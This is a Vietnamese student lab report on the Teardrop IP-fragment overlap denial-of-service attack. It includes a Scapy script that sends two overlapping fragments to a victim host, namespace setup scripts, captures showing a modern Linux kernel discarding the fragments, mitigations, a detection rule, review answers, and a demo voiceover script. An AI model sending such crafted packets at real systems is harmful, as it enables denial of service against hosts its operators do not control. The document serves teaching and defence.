# BÁO CÁO THỰC HÀNH CHI TIẾT — BÀI LAB 06
## Đề tài: Kỹ thuật tấn công Teardrop Attack (Overlapping IP Fragments DoS)

---

## I. MỤC TIÊU BÀI THỰC HÀNH

1. **Hiểu sâu sắc cơ chế Phân mảnh và Tái hợp gói tin IP (IP Fragmentation & Reassembly)**:
   * Nguyên nhân gói tin IP bị phân mảnh khi kích thước vượt quá kích thước đơn vị truyền tải tối đa (MTU - Maximum Transmission Unit) của đường truyền.
   * Các trường thông tin quan trọng trong IP Header phục vụ tái hợp gói: **Identification (ID)**, **Flags (DF, MF)** và **Fragment Offset**.
2. **Nghiên cứu kỹ thuật tấn công từ chối dịch vụ Teardrop kinh điển (CVE-1999-0015)**:
   * Cách kẻ tấn công cố tình tính toán sai lệch trường **Fragment Offset** để tạo ra các mảnh IP có dữ liệu bị đè (chồng lấn - overlapping) lên nhau.
   * Phân tích mã nguồn nhân hệ điều hành cũ (Linux 2.0.32, Windows 95/NT): Lỗi tính toán `fp->len = end - offset` dẫn đến số âm và ép kiểu thành $\approx 4\text{ GB}$ trong hàm `memcpy()`, gây sập máy (Blue Screen of Death / Kernel Panic).
3. **Thực nghiệm chế tạo gói tin Teardrop bằng Scapy**:
   * Viết script Python với Scapy chế tạo 2 mảnh IP chồng lấn: Mảnh 1 (0..23 byte) và Mảnh 2 (8..31 byte), trong đó đoạn từ byte 8 đến byte 23 bị chồng lấn 16 bytes.
4. **Kiểm chứng tính an toàn và miễn nhiễm của nhân Linux hiện đại**:
   * Quan sát máy Nạn nhân (`h2`) thông qua luồng ping liên tục: Máy vẫn hoạt động bình thường, không bị sập hay mất gói.
   * Đo đạc bộ đếm thống kê mạng tại `/proc/net/snmp`: Chỉ số `ReasmReqds` tăng 2 (nhận 2 mảnh) và chỉ số `ReasmFails` tăng 1 (phát hiện mảnh dị thường và hủy bỏ an toàn).

---

## II. KIẾN THỨC NỀN TẢNG CỐT LÕI

### 1. Phép ẩn dụ đời thực: "Quyển sách bị xé trang và ghi sai số thứ tự"
* Hãy tưởng tượng bạn muốn gửi một quyển sách dày cho bạn mình, nhưng khe hộp thư bưu điện quá nhỏ (tương tự giới hạn **MTU** của card mạng, thường là 1500 bytes).
* **Bình thường:** Bạn xé quyển sách thành nhiều tập mỏng:
  * Tập 1: Gồm các trang từ 1 đến 24. Đánh dấu: *"Còn tiếp"* (**cờ MF = 1**).
  * Tập 2: Gồm các trang từ 25 đến 40. Đánh dấu: *"Hết"* (**cờ MF = 0**).
  * Người nhận chỉ việc xếp tập 1 rồi ghép tập 2 vào sau là đọc được trọn vẹn quyển sách.
* **Tấn công Teardrop:** Kẻ xấu cố tình ghi nhãn số trang bị đè lên nhau:
  * Tập 1: Gồm các trang từ 1 đến 24 (**Offset = 0**, kết thúc tại 24).
  * Tập 2: Ghi nhãn bắt đầu từ trang 9 đến trang 32 (**Offset = 8 byte**, kết thúc tại 32).
  * **Hậu quả:** Đoạn từ trang 9 đến trang 24 bị thừa và đè lên nhau! Hệ thống phải giải quyết bài toán: Chép phần nào và bỏ phần nào?

---

### 2. Ba trường quan trọng trong IP Header điều khiển phân mảnh

```text
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Identification        |Flags|      Fragment Offset    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

1. **Identification (ID - 16 bit)**:
   * Mã định danh của gói tin gốc. Tất cả các mảnh cắt ra từ cùng một gói tin bắt buộc phải có **chung một giá trị ID** thì bên nhận mới biết để ghép lại với nhau.
2. **Flags (3 bit)**:
   * **Bit 0:** Dành riêng (phải luôn bằng 0).
   * **Bit 1 (DF - Don't Fragment):** Nếu = 1, cấm các router trên đường đi cắt nhỏ gói tin.
   * **Bit 2 (MF - More Fragments):** 
     * `MF = 1`: Báo hiệu rằng phía sau mảnh này vẫn còn các mảnh tiếp theo.
     * `MF = 0`: Mảnh cuối cùng của gói tin gốc.
3. **Fragment Offset (13 bit)**:
   * Vị trí bắt đầu của dữ liệu trong mảnh này so với gói tin gốc ban đầu.
   * **ĐẶC BIỆT LƯU Ý:** Do trường Offset chỉ có 13 bit nhưng gói tin IP tối đa tới 65,535 bytes, nên tiêu chuẩn RFC 791 quy định **đơn vị tính của Fragment Offset là 8 bytes (64 bits)**.
   * Ví dụ:
     * `frag = 0` $\rightarrow$ Bắt đầu từ byte thứ $0 \times 8 = 0$.
     * `frag = 1` $\rightarrow$ Bắt đầu từ byte thứ $1 \times 8 = 8$.
     * `frag = 3` $\rightarrow$ Bắt đầu từ byte thứ $3 \times 8 = 24$.

---

### 3. Cơ chế toán học của Teardrop: Sự khác biệt giữa 2 kịch bản

```text
GÓI TIN GỐC (Mong muốn tái hợp):
Byte: 0                               23 24                      31
      |--------------------------------|--------------------------|

MẢNH 1 (Offset = 0, Dài 24 bytes, MF = 1):
      [0 ............................ 23] (Chứa toàn ký tự 'A')

MẢNH 2 (Offset = 1 tức là Byte 8, Dài 24 bytes, MF = 0):
               [8 ............................ 31] (Chứa toàn ký tự 'B')

===> VÙNG CHỒNG LẤN (OVERLAP):
               [8 ............ 23]  <--- 16 bytes bị tranh chấp đè lên nhau!
```

#### A. Mã nguồn thực tế trong Linux 2.0.32 (`net/ipv4/ip_fragment.c`)
Khi Mảnh 2 tới và bị đè lên Mảnh 1, hàm xử lý của hệ điều hành thực hiện:
```c
/* Nếu Mảnh 2 bắt đầu (offset=8) trước khi Mảnh 1 kết thúc (prev->end=24) */
if (prev != NULL && offset < prev->end) {
    i = prev->end - offset;  // Phần trùng: i = 24 - 8 = 16 byte
    offset += i;             // Đẩy điểm bắt đầu của Mảnh 2 lên: offset = 8 + 16 = 24
    ptr += i;                // Nhảy con trỏ dữ liệu bỏ qua 16 byte trùng
}

/* Tính độ dài dữ liệu còn lại của Mảnh 2 để chép vào buffer: */
fp->len = end - offset;      // <--- ĐIỂM XẢY RA LỖI TỬ THẦN
```

#### B. Hai kịch bản tính toán:

| Đặc điểm so sánh | Kịch bản 1: Teardrop tử thần (Năm 1997) | Kịch bản 2: Bài Lab thực hành (Thầy cô giao) |
| :--- | :--- | :--- |
| **Cấu tạo Mảnh 2** | Bắt đầu từ byte 8, **chỉ dài 10 byte** (kết thúc tại byte 18, `end = 18`). Mảnh 2 lọt thỏm trong Mảnh 1! | Bắt đầu từ byte 8, **dài 24 byte** (kết thúc tại byte 32, `end = 32`). Mảnh 2 vươn dài ra sau Mảnh 1! |
| **Giá trị `offset` sau điều chỉnh** | Bị đẩy lên bằng điểm kết thúc của Mảnh 1: **`offset = 24`** | Bị đẩy lên bằng điểm kết thúc của Mảnh 1: **`offset = 24`** |
| **Công thức: `fp->len = end - offset`** | $\text{fp->len} = 18 - 24 = \mathbf{-6}$ **(Số ÂM)** | $\text{fp->len} = 32 - 24 = \mathbf{+8}$ **(Số DƯƠNG)** |
| **Hậu quả trên hệ điều hành cũ** | `-6` bị ép kiểu không dấu (`size_t`) trong `memcpy` thành $\approx \mathbf{4,2\text{ GB}}$. Ghi đè 4GB vào RAM $\rightarrow$ **SẬP MÁY / BSOD NGAY LẬP TỨC!** | Hệ thống cũ chấp nhận chép 8 byte còn lại vào cuối. |
| **Phản ứng của Kernel hiện đại** | Kernel kiểm tra biên: `if (end <= offset) return;` $\rightarrow$ Hủy gói tin, không bao giờ bị âm. | **Kernel nhận diện vùng 8..23 bị chồng lấn dị thường**, coi là gói tin hỏng $\rightarrow$ Hủy an toàn và tăng `ReasmFails` lên 1! |

---

## III. GIẢI THÍCH CHI TIẾT CÁC FILE MÃ NGUỒN

Các file phục vụ thực hành được lưu tại: `/home/tantayen/Projects/TCPIP/LabLoHongBaoMatTCPIP/`

### 1. File `setup_pair.sh` (Dựng topo 2 máy độc lập qua cặp veth)
* **Chức năng**: Khởi tạo 2 không gian mạng (`h1` và `h2`) kết nối trực tiếp với nhau bằng sợi cáp ảo `veth1 <---> veth2`.
* **Phân bổ địa chỉ IP**:
  * `h1`: `10.0.0.1/24` (Máy Kẻ tấn công).
  * `h2`: `10.0.0.2/24` (Máy Nạn nhân).
* **Mã nguồn**:
  ```bash
  #!/bin/bash
  set -e
  ip netns del h1 2>/dev/null || true
  ip netns del h2 2>/dev/null || true

  ip netns add h1
  ip netns add h2

  ip link add veth1 type veth peer name veth2
  ip link set veth1 netns h1
  ip link set veth2 netns h2

  ip netns exec h1 ip addr add 10.0.0.1/24 dev veth1
  ip netns exec h2 ip addr add 10.0.0.2/24 dev veth2

  ip netns exec h1 ip link set veth1 up
  ip netns exec h2 ip link set veth2 up
  ip netns exec h1 ip link set lo up
  ip netns exec h2 ip link set lo up

  echo "[+] Topo 2 may (h1: 10.0.0.1 <---> h2: 10.0.0.2) da san sang!"
  ip netns exec h1 ping -c 2 10.0.0.2
  ```

---

### 2. File `teardrop_attack.py` (Script phát động tấn công phân mảnh chồng lấn)
* **Chức năng**: Sử dụng thư viện Scapy chế tạo 2 mảnh IP chồng lấn (Teardrop) và phát tới máy Nạn nhân. Hỗ trợ chạy linh hoạt cả trên 2 máy thật Wi-Fi lẫn trong Network Namespace.
* **Mã nguồn chi tiết**:
  ```python
  #!/usr/bin/env python3
  # teardrop_attack.py - Mo phong tan cong phan manh IP chong lan (Teardrop Attack)
  # Ho tro: Ban manh IP truc tiep qua Wi-Fi toi may that hoac namespace
  import sys
  from scapy.all import *

  victim_ip = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.2"
  iface     = sys.argv[2] if len(sys.argv) > 2 else None
  ipid      = 1234  # Identification dung de kernel ben nhan biet cac manh cung mot goi

  # 1. Manh 1 (Fragment 1): frag=0 (Byte 0..23), co co MF=1 (con tiep)
  f1 = IP(dst=victim_ip, id=ipid, flags="MF", frag=0, proto=17) / (b"A" * 24)

  # 2. Manh 2 (Fragment 2) - MANH CHONG LAN: frag=1 (Byte 8..31), MF=0 (manh cuoi)
  # ==> Khoang tu byte 8 den byte 23 bi CHONG LAN (Overlap 16 bytes)!
  f2 = IP(dst=victim_ip, id=ipid, flags=0, frag=1, proto=17) / (b"B" * 24)

  print(f"[*] Dang ban 2 manh IP chong lan toi {victim_ip}...")
  if iface:
      send([f1, f2], iface=iface, verbose=0)
  else:
      send([f1, f2], verbose=0)
  print("[+] DA GUI THANH CONG!")
  ```

---

### 3. File `clean_pair.sh` (Dọn dẹp môi trường khi chạy mô phỏng)
* **Chức năng**: Xóa sạch các namespace và bridge sau khi kết thúc bài lab:
  ```bash
  #!/bin/bash
  for ns in h1 h2 vic gw atk dst amp1 amp2 amp3; do
      ip netns del $ns 2>/dev/null || true
  done
  ip link del br0 2>/dev/null || true
  ```

---

## IV. QUÁ TRÌNH THỰC HÀNH & KẾT QUẢ ĐẠT ĐƯỢC

### PHƯƠNG ÁN 1: TRIỂN KHAI TRÊN 2 MÁY THẬT KALI LINUX (CÙNG KẾT NỐI WI-FI)

#### Thiết lập ban đầu:
* **Máy 1 (Attacker)**: IP Wi-Fi (ví dụ `192.168.1.50`), card mạng `wlan0`.
* **Máy 2 (Victim)**: IP Wi-Fi (ví dụ `192.168.1.100`), card mạng `wlan0`.

#### Trình tự thực hành trên 2 máy thật:

1. **Bước 1 — Trên Máy 2 (Victim): Ghi nhận chỉ số thống kê mạng ban đầu:**
   ```bash
   netstat -s | grep -i -E "reassembl|fragments"
   ```
   * *Kết quả:* Chỉ số `reassemblies failed` hoặc `fragments dropped` ban đầu có giá trị bằng `0` (chưa có lỗi phân mảnh nào).

2. **Bước 2 — Trên Máy 2 (Victim): Bật `tcpdump` soi các gói tin phân mảnh:**
   ```bash
   sudo tcpdump -i wlan0 -nn -v 'ip[6:2] & 0x3fff != 0'
   ```
   * Bộ lọc BPF `'ip[6:2] & 0x3fff != 0'` sẽ bắt giữ tất cả các gói tin có cờ More Fragments (MF) hoặc có Fragment Offset > 0.

3. **Bước 3 — Trên Máy 1 (Attacker): Phát động tấn công Teardrop:**
   ```bash
   sudo python3 teardrop_attack.py 192.168.1.100 wlan0
   ```
   * Script Scapy phát 2 mảnh IP chồng lấn (ID=1234, Mảnh 1 offset 0, Mảnh 2 offset 8) trực tiếp qua sóng Wi-Fi tới Máy 2.

4. **Bước 4 — Trên Máy 2 (Victim): Quan sát gói tin và kiểm tra bộ đếm SNMP:**
   * Màn hình `tcpdump` trên Máy 2 lập tức bắt được 2 mảnh IP phân mảnh ập vào card `wlan0`:
     ```text
     IP (frag 1234:24@0+) 192.168.1.50 > 192.168.1.100: proto UDP
     IP (frag 1234:24@8)  192.168.1.50 > 192.168.1.100: proto UDP
     ```
   * Nhấn `Ctrl + C` dừng `tcpdump`, kiểm tra lại bộ đếm thống kê:
     ```bash
     netstat -s | grep -i -E "reassembl|fragments"
     ```
   * *Kết quả:* Chỉ số `ReasmReqds` tăng thêm 2 và `ReasmFails` tăng thêm 1!

5. **Bước 5 — Kiểm chứng "nhịp tim" chứng minh máy Victim sống sót:**
   * Từ Máy 1, gửi luồng ping kiểm tra trạng thái của Máy 2:
     ```bash
     ping -c 3 192.168.1.100
     ```
   * *Kết quả:* Máy 2 phản hồi bình thường 100%, RTT cực thấp, hoàn toàn không bị sập màn hình xanh hay treo đơ hệ thống!

---

### PHƯƠNG ÁN 2: TRIỂN KHAI TRÊN 1 MÁY MÔ PHỎNG QUA NETWORK NAMESPACE

#### Bố trí môi trường:
* Dựng topo 2 máy ảo: `sudo bash setup_pair.sh` (`h1: 10.0.0.1` và `h2: 10.0.0.2`).
* Tại `h2`:
  ```bash
  sudo ip netns exec h2 netstat -s | grep -i -E "reassembl|fragments"
  sudo ip netns exec h2 tcpdump -i veth2 -nn -v 'ip[6:2] & 0x3fff != 0'
  ```
* Tại `h1`:
  ```bash
  sudo ip netns exec h1 python3 teardrop_attack.py
  ```
* Kết quả: `h2` nhận 2 mảnh phân mảnh, chỉ số `ReasmFails` tăng 1. Lệnh `ping -c 3 10.0.0.2` từ `h1` thành công 100%. Dọn dẹp bằng `clean_pair.sh`.
Tại một tab terminal khác của Nạn nhân (`h2`):
```bash
sudo ip netns exec h2 tcpdump -i veth2 -nn -v ip and not icmp
```
* Bộ lọc `not icmp` giúp bỏ qua gói tin ping nền để chỉ tập trung bắt các gói UDP phân mảnh của đòn tấn công Teardrop.

---

### Bước 5: Kẻ tấn công phát động Teardrop Attack
Tại terminal của Kẻ tấn công (`h1`), kích hoạt script:
```bash
sudo ip netns exec h1 python3 teardrop_attack.py
```
* **Kết quả xuất ra**:
  ```text
  ==================================================================
  [*] TAN CONG TEARDROP ATTACK (OVERLAPPING IP FRAGMENTS)
  ==================================================================
  [*] Muc tieu nan nhan (Victim):       10.0.0.2
  [*] IP Identification (ID goi):       1234
  [*] Giao thuc mang theo (Protocol):    17 (UDP)
  ==================================================================
  [*] Thong tin chi tiet cac manh IP duoc che tao:
      - Manh 1: Offset = 0 (Byte 0..23), Co MF = 1 (Con manh)
      - Manh 2: Offset = 1 (Byte 8..31), Co MF = 0 (Manh cuoi)
      ==> Vung chong lan (Overlap): Byte 8 den Byte 23 (16 byte bi de len nhau!)
  ==================================================================
  [*] Dang ban 2 manh IP chong lan toi 10.0.0.2...
  [+] DA GUI THANH CONG!
  ```

---

### Bước 6: Quan sát và đánh giá kết quả thực nghiệm

1. **Quan sát trên terminal `tcpdump` của Nạn nhân (`h2`)**:
   ```text
   IP (tos 0x0, ttl 64, id 1234, offset 0, flags [+], proto UDP (17), length 44)
       10.0.0.1 > 10.0.0.2: ip-proto-17
   IP (tos 0x0, ttl 64, id 1234, offset 8, flags [none], proto UDP (17), length 44)
       10.0.0.1 > 10.0.0.2: ip-proto-17
   ```
   * **Phân tích chi tiết từng gói bắt được**:
     * Mảnh 1: `id 1234`, `offset 0`, `flags [+]` (tức là cờ `MF = 1`).
     * Mảnh 2: `id 1234`, `offset 8` (tức `frag = 1`, đơn vị 8 byte), `flags [none]` (tức `MF = 0`).

2. **Kiểm tra trạng thái "sống còn" của Nạn nhân**:
   * Nhìn vào terminal ping nền ở Bước 3: **Ping vẫn nhảy đều đặn, không hề bị rớt một gói nào, thời gian trễ cực thấp (~0.05ms)**!
   * Kiểm tra nhật ký nhân: `sudo ip netns exec h2 dmesg | tail` $\rightarrow$ Hoàn toàn không có bất kỳ thông báo lỗi Kernel Panic hay Crash nào!

3. **Kiểm tra biến thống kê `/proc/net/snmp` sau tấn công**:
   ```bash
   sudo ip netns exec h2 cat /proc/net/snmp | grep -A1 '^Ip:'
   ```
   * **Bảng so sánh trước và sau khi tấn công**:

| Tham số thống kê trong `/proc/net/snmp` | Trước tấn công | Sau tấn công | Ý nghĩa kỹ thuật |
| :--- | :---: | :---: | :--- |
| **`ReasmReqds`** (Số mảnh yêu cầu ghép) | `0` | **`2`** | Nạn nhân nhận đúng 2 mảnh IP mang chung ID `1234` |
| **`ReasmOKs`** (Tái hợp thành công) | `0` | **`0`** | Không có gói tin nào được ghép thành công |
| **`ReasmFails`** (Tái hợp thất bại) | `0` | **`1`** | **Kernel phát hiện dữ liệu chồng lấn dị thường và hủy an toàn!** |

* **KẾT LUẬN QUAN TRỌNG:** Nhân Linux hiện đại đã **hoàn toàn miễn nhiễm** trước tấn công Teardrop Attack nhờ cơ chế kiểm tra biên chặt chẽ khi tái hợp mảnh IP!

---

## V. CƠ CHẾ PHÒNG THỦ (MITIGATION)

1. **Cập nhật hệ điều hành và Kernel**:
   * Lỗ hổng Teardrop kinh điển (CVE-1999-0015) đã được cộng đồng mã nguồn mở và Microsoft vá từ cuối thập niên 1990 (từ Linux kernel 2.0.32 và các bản vá Service Pack của Windows NT 4.0).
2. **Cơ chế lọc và làm sạch phân mảnh tại Tường lửa (Fragment Scrubbing - RFC 1858)**:
   * Các thiết bị tường lửa thế hệ mới (Next-Gen Firewall / pfSense / iptables) thực hiện tập hợp lại tất cả các mảnh IP ở biên mạng trước khi cho vào mạng nội bộ.
   * Nếu phát hiện các mảnh có trường `offset` chồng lấn, tường lửa sẽ **tự động cắt tỉa (de-overlap)** hoặc thả rơi gói tin ngay lập tức.
3. **Cấu hình giới hạn tài nguyên hàng đợi tái hợp**:
   * Để chống lại việc kẻ tấn công gửi hàng triệu mảnh lẻ làm cạn kiệt RAM (Memory Exhaustion DoS), Linux cho phép giới hạn dung lượng bộ nhớ dành cho việc tái hợp:
     ```bash
     sysctl -w net.ipv4.ipfrag_high_thresh=4194304  # Giới hạn tối đa 4MB
     sysctl -w net.ipv4.ipfrag_time=30             # Quá 30s không đủ mảnh thì xóa
     ```
4. **Hệ thống phát hiện xâm nhập (IDS/IPS)**:
   * Các hệ thống như Snort/Suricata có sẵn luật nhận diện chữ ký phân mảnh dị thường:
     `alert ip any any -> any any (msg:"ET EXPLOIT Teardrop IP fragmentation overlap"; fragbits:M; fragoffset:>0;)`

---

## VI. CÂU HỎI ÔN TẬP & TRẢ LỜI ĐÁNH GIÁ

### Câu 1: Fragment Offset được tính theo đơn vị nào? Hai mảnh ở Bước 2.3 chồng lấn ở khoảng byte nào?
* **Trả lời:**
  * **Đơn vị tính:** Fragment Offset được tính theo **đơn vị khối 8 bytes (64 bits)**.
  * **Khoảng byte chồng lấn**:
    * Mảnh 1 có `frag = 0`, mang 24 bytes dữ liệu $\rightarrow$ Chiếm khoảng từ **Byte 0 đến Byte 23**.
    * Mảnh 2 có `frag = 1` ($1 \times 8 = 8$), mang 24 bytes dữ liệu $\rightarrow$ Chiếm khoảng từ **Byte 8 đến Byte 31**.
    * Như vậy, hai mảnh này bị **chồng lấn tại khoảng từ Byte 8 đến Byte 23** (tổng cộng 16 bytes bị đè lên nhau).

### Câu 2: Vì sao các mảnh chồng lấn từng làm hệ thống cũ bị sập (Crash)? Kernel hiện đại xử lý khác biệt ra sao?
* **Trả lời:**
  * **Hệ thống cũ bị sập**: Trong mã nguồn của Linux 2.0.32, sau khi điều chỉnh `offset` tăng lên để bỏ qua phần trùng với Mảnh 1, Kernel tính độ dài dữ liệu còn lại bằng công thức `fp->len = end - offset`. Trong đòn Teardrop nguyên bản, kẻ tấn công gửi Mảnh 2 có điểm kết thúc nhỏ hơn Mảnh 1 ($end_2 < end_1$), khiến phép trừ ra **số âm** (ví dụ $18 - 24 = -6$). Khi truyền số âm này vào hàm `memcpy(dest, src, size_t count)`, do biến `count` là số nguyên không dấu, con số âm bị ép kiểu thành một con số dương khổng lồ (~4.2GB). Việc cố sao chép 4.2GB dữ liệu vào RAM đã ghi đè toàn bộ dữ liệu quan trọng của Kernel, gây ra **Màn hình xanh (BSOD)** hoặc **Kernel Panic** làm sập máy ngay lập tức.
  * **Kernel hiện đại**: Có thuật toán kiểm tra biên nghiêm ngặt (Bounds Checking). Kernel luôn kiểm tra nếu $end \le offset$, nó lập tức từ chối ghép, hủy bỏ các mảnh dị thường và ghi nhận lỗi vào `ReasmFails`, đảm bảo hệ thống không bao giờ bị crash.

### Câu 3: Giá trị `ReasmFails` thay đổi như thế nào trước và sau khi tấn công? Nó cho biết điều gì?
* **Trả lời:**
  * **Thay đổi:** Trước khi tấn công, `ReasmFails` có giá trị là `0`. Sau khi Kẻ tấn công bắn 2 mảnh Teardrop, `ReasmFails` **tăng lên thành `1`** (đồng thời `ReasmReqds` tăng thêm `2`).
  * **Ý nghĩa:** Chỉ số này khẳng định rằng máy Nạn nhân đã thực sự tiếp nhận 2 mảnh phân mảnh, nhưng trong quá trình ghép nối, bộ giải mã IP của Kernel đã phát hiện gói tin bị sai lệch cấu trúc biên nên đã từ chối và giải phóng bộ đệm. Đây là bằng chứng định lượng rõ ràng nhất chứng minh đòn tấn công đã diễn ra và đã bị nhân Linux chặn đứng an toàn.

### Câu 4: Ngoài Teardrop, hãy nêu một số kỹ thuật tấn công khác cũng lợi dụng cơ chế phân mảnh IP và cách phòng chống?
* **Trả lời:**
  1. **Ping of Death**: Kẻ tấn công gửi các mảnh IP có tổng kích thước sau khi tái hợp vượt quá giới hạn tối đa của giao thức IPv4 ($> 65,535$ bytes), làm tràn bộ đệm nhận gói của hệ điều hành cũ.
  2. **Tiny Fragment Attack**: Kẻ tấn công cố tình cắt gói tin TCP thành các mảnh cực nhỏ (ví dụ mảnh 1 chỉ chứa 8 byte IP header mà không đủ chứa TCP port). Mục đích là để qua mặt các bộ lọc tường lửa (Firewall ACL) chỉ kiểm tra gói đầu tiên, giúp lưu lượng độc hại lọt qua.
  3. **Overlapping Fragment Evasion (Vượt mặt IDS)**: Kẻ tấn công gửi mảnh 1 chứa dữ liệu vô hại, sau đó gửi mảnh 2 ghi đè dữ liệu độc hại lên mảnh 1. Do cách ghép mảnh của IDS và máy chủ đích có thể khác nhau (First vs. Last reassembly policy), IDS thấy gói tin sạch nhưng máy đích lại ghép ra gói tin độc hại.
  * **Phòng chống:** Sử dụng tường lửa có tính năng **Virtual Reassembly / Fragment Normalization** để chuẩn hóa và ghép mảnh tại biên mạng trước khi chuyển tiếp vào bên trong.

---

## VII. KỊCH BẢN THUYẾT TRÌNH KHI QUAY VIDEO (VOICEOVER)

Báo cáo cung cấp **2 phương án kịch bản tương ứng**:
* **Kịch bản A:** Dành cho quay video trực tiếp trên **2 máy vật lý Kali Linux qua Wi-Fi**.
* **Kịch bản B:** Dành cho quay video trên **1 máy Kali Linux mô phỏng bằng Network Namespace**.

---

### KỊCH BẢN A: DÀNH CHO QUAY VIDEO TRÊN 2 MÁY THẬT (QUA MẠNG WI-FI)

> **Bố cục đề xuất khi quay video:**
> * **Máy 1 (Bên trái):** Kali Linux - Máy Kẻ tấn công (IP ví dụ: `192.168.1.50`, card `wlan0`).
> * **Máy 2 (Bên phải):** Kali Linux - Máy Nạn nhân (IP ví dụ: `192.168.1.100`, card `wlan0`).
> * *Nguyên tắc:* Gõ lệnh tới đâu, giải thích ngay chức năng và ý nghĩa kỹ thuật tới đó.

#### [0:00 - 0:35] Mở đầu & Giới thiệu đề tài
* **Lời thoại:**
  *"Kính chào thầy và các bạn! Hôm nay nhóm em xin trình bày bài thực hành số 06: Kỹ thuật tấn công từ chối dịch vụ phân mảnh IP Teardrop Attack (IP Fragmentation Overlap DoS) và Kiểm chứng tính an toàn của nhân Linux hiện đại trên 2 máy tính vật lý Kali Linux cùng kết nối mạng Wi-Fi. Trong kiến trúc IPv4, khi gói tin vượt quá MTU đường truyền, nó sẽ bị chia nhỏ thành nhiều mảnh. Bên nhận dựa vào trường ID và Fragment Offset để ghép lại. Đòn tấn công Teardrop kinh điển phát sinh khi kẻ tấn công cố tình tính toán sai lệch trường offset để các mảnh dữ liệu đè lên nhau, khiến hàm giải mã của các hệ điều hành cũ bị tràn bộ nhớ và đánh sập máy tính!"*

#### [0:35 - 1:15] Bước 1: Kiểm tra IP và thông tuyến Wi-Fi giữa 2 máy
* **Thao tác 1 (Trên Máy 2 - Kiểm tra IP):**
  ```bash
  ip -br addr show wlan0
  ```
  * **Lời thoại:**
    *"Trước tiên, trên Máy 2 bên phải, em kiểm tra địa chỉ IP Wi-Fi là `192.168.1.100`. Đây là máy chủ nạn nhân."*

* **Thao tác 2 (Trên Máy 1 - Kiểm tra IP & Ping sang Máy 2):**
  ```bash
  ip -br addr show wlan0
  ping -c 2 192.168.1.100
  ```
  * **Lời thoại:**
    *"Trên Máy 1 bên trái, em kiểm tra IP là `192.168.1.50` và gửi 2 gói ping sang Máy 2. Kết nối thông suốt 100%, sẵn sàng cho thử nghiệm!"*

#### [1:15 - 2:05] Bước 2: Kiểm tra bộ đếm SNMP trước tấn công & Bật tcpdump trên Máy 2
* **Thao tác 1 (Trên Máy 2 - Kiểm tra bộ đếm SNMP):**
  ```bash
  netstat -s | grep -i -E "reassembl|fragments"
  ```
  * **Lời thoại:**
    *"Trên Máy 2, em kiểm tra bộ đếm thống kê IP của Kernel bằng lệnh `netstat -s`. Thầy và các bạn thấy chỉ số `reassemblies failed` hiện tại đang bằng 0, nghĩa là máy chưa gặp bất kỳ lỗi phân mảnh nào."*

* **Thao tác 2 (Trên Máy 2 - Bật tcpdump bắt các gói tin phân mảnh):**
  ```bash
  sudo tcpdump -i wlan0 -nn -v 'ip[6:2] & 0x3fff != 0'
  ```
  * **Lời thoại:**
    *"Tiếp theo, trên Máy 2 em bật `tcpdump` trên card `wlan0` với bộ lọc `ip[6:2] & 0x3fff != 0` để chỉ bắt những gói tin có cờ More Fragments hoặc Fragment Offset lớn hơn 0."*

#### [2:05 - 3:15] Bước 3: Phát động tấn công Teardrop từ Máy 1
* **Thao tác trên Máy 1:**
  ```bash
  sudo python3 teardrop_attack.py 192.168.1.100 wlan0
  ```
* **Lời thoại giải thích:**
  *"Bây giờ tại Máy 1 bên trái, em kích hoạt lệnh `sudo python3 teardrop_attack.py 192.168.1.100 wlan0`. Script Scapy này chế tạo một gói tin phân mảnh bất thường có cùng mã định danh `ID = 1234`:
  * *Mảnh 1: Có `frag = 0`, bật cờ `MF = 1`, mang 24 bytes tải 'A' (từ byte 0 đến 23).*
  * *Mảnh 2: Có `frag = 1` (đơn vị 8 byte, tức bắt đầu từ byte 8), tắt cờ `MF = 0`, mang 24 bytes tải 'B' (từ byte 8 đến 31).*
  
  *Điểm bất thường mấu chốt: Đoạn từ byte 8 đến byte 23 bị **chồng lấn đè lên nhau 16 bytes**! Trên Windows 95 hay Linux 2.0 cũ, phép tính độ dài còn lại bị âm, hàm `memcpy` ép kiểu thành 4GB làm tràn RAM và gây màn hình xanh sập máy ngay lập tức!
  
  *Thầy và các bạn hãy nhìn sang Máy 2: Màn hình tcpdump đã bắt được trọn vẹn 2 mảnh UDP ID 1234 offset 0 và offset 8 ập vào card Wi-Fi!"*

#### [3:15 - 4:10] Bước 4: Kiểm chứng tính miễn nhiễm của Linux Kernel & Đo nhịp tim
* **Thao tác 1 (Trên Máy 2 - Nhấn Ctrl+C dừng tcpdump, kiểm tra lại bộ đếm SNMP):**
  ```bash
  netstat -s | grep -i -E "reassembl|fragments"
  ```
  * **Lời thoại:**
    *"Tại Máy 2, em dừng tcpdump và kiểm tra lại bộ đếm thống kê mạng: Bộ đếm yêu cầu ghép mảnh `ReasmReqds` đã tăng lên 2 và bộ đếm ghép mảnh thất bại `ReasmFails` đã tăng lên 1! Điều này chứng minh nhân Linux Kernel đã phát hiện sự bất thường của các mảnh đè lên nhau và chủ động tiêu hủy an toàn!"*

* **Thao tác 2 (Trên Máy 1 - Gửi ping đo nhịp tim sống còn của Máy 2):**
  ```bash
  ping -c 3 192.168.1.100
  ```
  * **Lời thoại:**
    *"Để chứng minh Máy 2 hoàn toàn không bị sập hay treo máy, từ Máy 1 em gửi lệnh ping kiểm tra nhịp tim. Cả 3 gói ping đều phản hồi ngay lập tức với 0% packet loss! Máy nạn nhân hoàn toàn miễn nhiễm và sống sót an toàn!"*

#### [4:10 - 4:50] Bước 5: Tổng kết & Biện pháp an ninh mạng
* **Lời thoại giải thích:**
  *"Qua thực nghiệm trên 2 máy thật, chúng ta thấy rõ các hệ điều hành hiện đại đã vá triệt để lỗ hổng Teardrop nhờ cơ chế Bounds Checking chặt chẽ trong Kernel. Ngoài ra, trong mạng doanh nghiệp thực tế, các thiết bị Firewall biên luôn trang bị tính năng **Virtual Reassembly / Packet Scrubbing** để làm sạch và ráp nối các mảnh phân mảnh trước khi cho phép đi vào máy chủ nội bộ. Nhóm em xin kết thúc bài thực hành số 06 tại đây!"*

---

### KỊCH BẢN B: DÀNH CHO QUAY VIDEO TRÊN 1 MÁY (MÔ PHỎNG NETWORK NAMESPACE)

> **Bố cục đề xuất khi quay video:**
